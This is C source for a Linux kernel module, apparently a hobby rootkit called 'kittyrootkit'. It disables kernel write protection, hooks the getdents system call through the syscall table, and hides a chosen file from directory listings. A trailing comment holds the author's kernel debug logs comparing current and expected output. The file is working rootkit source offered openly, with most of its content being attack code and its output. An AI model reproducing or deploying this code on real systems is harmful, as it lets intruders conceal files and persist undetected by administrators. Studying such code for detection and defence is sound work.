#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("SourceCodeDeleted");
MODULE_DESCRIPTION("Hide File Module");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;



void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 



//define our origional function. 
// Credit this author. 
// https://zuliu.me/2018/03/22/rootkit/
// My code was similar but had a few problems. Zuliu had a few better in his code.
/*
int getdents(unsigned int fd,   struct linux_dirent   *dirp,    unsigned int count);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,    unsigned int count);
*/


struct linux_dirent {
	unsigned long	  d_ino;    /* Inode number */
	unsigned long	  d_off;	  /* Offset to next linux_dirent */
	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
	char		      d_name[];   // the struct value is actually longer than this, and d_name is variable width.
}*dirp2 , *dirp3 , *retn;   // // dirp = directory pointer




char hide[]="secretfile.txt";


asmlinkage int ( *original_getdents ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 

//Create Our version of Open Function.  
asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  struct linux_dirent *retn, *dirp3; 
  int Records, RemainingBytes, length;

  Records = (*original_getdents) (fd, dirp, count);

  if (Records <= 0){
    return Records;
  }

  retn = (struct linux_dirent *) kmalloc(Records, GFP_KERNEL);
  //Copy struct from userspace to our memspace in kernel space
  copy_from_user(retn, dirp, Records);

  dirp3 = retn;
  RemainingBytes = Records;
  

  while(RemainingBytes > 0){
    length = dirp3->d_reclen;
    RemainingBytes -= dirp3->d_reclen;
  
    printk(KERN_INFO "RemainingBytes %d   \t File: %s " ,  RemainingBytes , dirp3->d_name );

    if(strcmp( (dirp3->d_name) , hide ) == 0){
      memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, RemainingBytes);
      Records -= length; //  dirp3->d_reclen; // leads to mistake?
    }
    dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);

  }
  // Copy the record back to the origional struct
  copy_to_user(dirp, retn, Records);
  kfree(retn);
  return Records;
}


// Set up hooks.
static int __init SetHooks(void) {
	// Gets Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting();

  // Replaces Pointer Of Syscall_open on our syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting();

	return 0;
}







static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting();
	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);

/*
Default - 

Feb  2 12:45:28 ForeignHost kernel: [ 1670.710680] HooksCleaned Up!
Feb  2 12:45:28 ForeignHost kernel: [ 1685.668154] Hooks Will Be Set.
Feb  2 12:45:28 ForeignHost kernel: [ 1685.668155] System call table at 00000000a21b68dc
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104769] File Found .kittyrootkit.o.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104772] File Found .cache.mk 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104774] File Found .main.o.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104776] File Found main.o.ur-safe 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104778] File Found testfile 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104779] File Found modules.order 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104781] File Found kittyrootkit.ko 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104782] File Found Module.symvers 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104784] File Found kittyrootkit.mod.o 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104786] File Found .kittyrootkit.ko.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104787] File Found .vscode 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104789] File Found secRecordsfile.txt 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104790] File Found main.c 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104791] File Found test.txt 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104793] File Found .. 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104794] File Found kittyrootkit.o 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104796] File Found .kittyrootkit.mod.o.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104797] File Found main.o 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104799] File Found kittyrootkit.mod.c 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104800] File Found .RemainingBytes_versions 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104802] File Found . 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.921168] File Found . 





Should be - 
Feb  2 12:45:28 ForeignHost kernel: [ 1670.710680] HooksCleaned Up!
Feb  2 12:45:28 ForeignHost kernel: [ 1685.668154] Hooks Will Be Set.
Feb  2 12:45:28 ForeignHost kernel: [ 1685.668155] System call table at 00000000a21b68dc
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104769] File Found .kittyrootkit.o.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104772] File Found .cache.mk 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104774] File Found .main.o.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104776] File Found main.o.ur-safe 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104778] File Found testfile 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104779] File Found modules.order 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104781] File Found kittyrootkit.ko 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104782] File Found Module.symvers 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104784] File Found kittyrootkit.mod.o 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104786] File Found .kittyrootkit.ko.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104787] File Found .vscode 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104790] File Found main.c 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104791] File Found test.txt 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104793] File Found .. 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104794] File Found kittyrootkit.o 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104796] File Found .kittyrootkit.mod.o.cmd 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104797] File Found main.o 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104799] File Found kittyrootkit.mod.c 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104800] File Found .RemainingBytes_versions 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.104802] File Found . 
Feb  2 12:45:29 ForeignHost kernel: [ 1686.921168] File Found . 















Feb  1 22:37:45 ForeignHost kernel: [  606.944551] Hooks Will Be Set.
Feb  1 22:37:45 ForeignHost kernel: [  606.944552] System call table at 000000003ea170af
Feb  1 22:37:47 ForeignHost kernel: [  608.805231] File Found .kittyrootkit.o.cmd 
Feb  1 22:37:47 ForeignHost kernel: [  608.805235] File Found .cache.mk 
Feb  1 22:37:47 ForeignHost kernel: [  608.805237] File Found .main.o.cmd 
Feb  1 22:37:47 ForeignHost kernel: [  608.805239] File Found main.o.ur-safe 
Feb  1 22:37:47 ForeignHost kernel: [  608.805240] File Found testfile 
Feb  1 22:37:47 ForeignHost kernel: [  608.805242] File Found modules.order 
Feb  1 22:37:47 ForeignHost kernel: [  608.805243] File Found kittyrootkit.ko 
Feb  1 22:37:47 ForeignHost kernel: [  608.805245] File Found Module.symvers 
Feb  1 22:37:47 ForeignHost kernel: [  608.805247] File Found kittyrootkit.mod.o 
Feb  1 22:37:47 ForeignHost kernel: [  608.805248] File Found .kittyrootkit.ko.cmd 
Feb  1 22:37:47 ForeignHost kernel: [  608.805250] File Found .vscode 
Feb  1 22:37:47 ForeignHost kernel: [  608.805251] File Found .vscode 
Feb  1 22:37:47 ForeignHost kernel: [  608.805253] File Found main.c 
Feb  1 22:37:47 ForeignHost kernel: [  608.805254] File Found test.txt 
Feb  1 22:37:47 ForeignHost kernel: [  608.805256] File Found .. 
Feb  1 22:37:47 ForeignHost kernel: [  608.805257] File Found kittyrootkit.o 
Feb  1 22:37:47 ForeignHost kernel: [  608.805259] File Found .kittyrootkit.mod.o.cmd 
Feb  1 22:37:47 ForeignHost kernel: [  608.805260] File Found main.o 
Feb  1 22:37:47 ForeignHost kernel: [  608.805262] File Found kittyrootkit.mod.c 
Feb  1 22:37:47 ForeignHost kernel: [  608.805263] File Found .RemainingBytes_versions 
Feb  1 22:37:48 ForeignHost kernel: [  608.805264] File Found . 
Feb  1 22:37:48 ForeignHost kernel: [  610.146290] File Found . 


















*/